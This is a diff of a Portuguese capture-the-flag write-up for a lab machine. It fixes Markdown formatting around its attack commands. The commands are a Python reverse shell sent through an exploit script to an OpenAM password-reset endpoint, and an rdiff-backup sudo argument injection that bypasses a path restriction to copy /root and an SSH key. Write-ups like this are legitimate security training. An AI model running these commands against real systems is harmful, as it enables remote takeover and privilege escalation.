@@ -34,9 +34,11 @@ Foi utilizado um script customizado para enviar a requisição HTTP contendo o p
 
 ```bash
 python3 exploit.py --url [https://sso.management.htb/openam/ui/PWResetUserValidation](https://sso.management.htb/openam/ui/PWResetUserValidation) "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.17.83\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"
+```
 
 Após o disparo, obtivemos a conexão reversa sob o contexto da conta de serviço e resgatamos a flag user.txt.
-3. Enumeração Interna e Exploração do MariaDB
+
+## 3. Enumeração Interna e Exploração do MariaDB
 
 Com o acesso como usuário interno (owen), a fase de enumeração buscou arquivos de configuração locais e instâncias de banco de dados rodando na máquina para encontrar credenciais reutilizadas ou dados sensíveis.
 
@@ -58,10 +60,12 @@ Exploração da vulnerabilidade no rdiff-backup
 
 A regra do sudo limitava a execução ao diretório /opt/backup via --restrict-path. Contudo, a sintaxe de conexão remota do rdiff-backup (/::/root) permitiu injetar o argumento --restrict-path / no comando executado pelo sudo, sobrescrevendo a restrição anterior de /opt/backup.
 Execução do Payload Root
-Bash
+
+```Bash
 
 rdiff-backup \
   --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" \
-  backup /::/root /tmp/root_backup
+  backup /::/root /tmp/root_backup 
+  ```
 
 Com o espelhamento do diretório /root concluído em /tmp/root_backup, obteve-se acesso à flag root.txt e à chave SSH do administrador.
